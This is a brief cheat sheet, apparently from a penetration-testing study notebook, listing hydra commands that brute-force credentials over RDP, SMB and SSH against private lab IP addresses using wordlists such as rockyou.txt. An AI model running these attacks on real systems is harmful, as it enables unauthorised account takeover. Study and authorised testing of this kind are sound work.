hydra is used to brute force password, in [[password breaking]] operations.

#### RDP

for user probing
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

for password breaking
```
hydra -l nadine -P rockyou.txt rdp://192.168.50.202
```


#### SMB
```
hydra -l nadine -P rockyou.txt smb://192.168.50.202
```

#### SSH
```
hydra -L usernames.txt -P passwords.txt ssh://192.168.255.255 -t 4 -vV
```
`-vV`: Shows detailed progress in the terminal
`-t 4`: Controls speed by limiting to 4 simultaneous attempts